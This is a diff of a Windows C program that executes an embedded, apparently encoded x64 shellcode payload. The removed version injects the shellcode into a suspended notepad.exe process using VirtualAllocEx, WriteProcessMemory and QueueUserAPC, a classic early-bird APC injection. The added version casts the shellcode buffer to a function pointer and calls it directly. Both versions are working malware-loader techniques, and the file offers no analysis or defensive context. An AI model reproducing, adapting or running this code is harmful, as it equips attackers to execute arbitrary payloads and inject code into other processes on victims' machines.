@@ -1,13 +1,9 @@
-#include <stdio.h>
-#include <windows.h>
+#include <Windows.h>
+#include <time.h>
 
-int createProcessF()
-
-{
-
-  
-    unsigned char buf[] = 
-                          "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
+int main() {
+    CHAR shellcode[] = 
+                        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
 "\xff\xff\xff\x48\xbb\x1b\x42\xee\xa5\xe3\x5c\x18\x13\x48"
 "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xe7\x0a\x6d"
 "\x41\x13\xb4\xd8\x13\x1b\x42\xaf\xf4\xa2\x0c\x4a\x42\x4d"
@@ -43,55 +39,9 @@ int createProcessF()
 "\xa6\xb9\x14\xaf\x1f\x45\xc9\xa5\x8e\xe4\x97\xa6\x26\x27"
 "\x74\x24\x15\x67\x48\x6e\x5e\x03\x29\x1d\xa8\x5c\x51\x9c"
 "\xca\x89\x5c\x41\x52\x92\x98\x11\x70\xe3\x5c\x18\x13";
-
-
-    size_t shellcode = sizeof(buf);
-    STARTUPINFOW si = {0};
-    PROCESS_INFORMATION pi = {0};
-
-    int createProcess = CreateProcessW(L"C:\\WINDOWS\\system32\\notepad.exe",NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-
-        if (!createProcess)
-
-        {
-
-            printf("(-) Process creation has failed please try again.\n Error: %ld", GetLastError);
-
-            return EXIT_FAILURE;
-
-        }
-
-        else
-        {
-
-            printf("(+) Process was successfully created and started!\n PID: %ld", pi.dwProcessId);
-
-            printf("\n\nProcess with PID:%ld has been started, goodbye.", pi.dwProcessId);
-
-            //return EXIT_SUCCESS;
-
-        }
-
-    HANDLE hProcess = pi.hProcess;
-    HANDLE hThread = pi.hThread;
-
-    LPVOID shelladdress = VirtualAllocEx(hProcess, NULL, shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shelladdress;
-
-    WriteProcessMemory(hProcess, shelladdress, buf, shellcode, NULL);
-    QueueUserAPC((PAPCFUNC)shelladdress, hThread, (ULONG_PTR)0);
-    ResumeThread(hThread);
-
-    return 0;
-
-}
-
-int main()
-
-{
-
-printf("Starting notepad.exe as a new process...\n\n");
-
-createProcessF();
-
-}
+    
+    int(*loader)(); // Create a function pointer called loader
+    loader = (int(*)())shellcode; // cast shellcode to be a function pointer
+    loader(); // call the function which will exec our shellcode
+    return 0; // return
+}                   
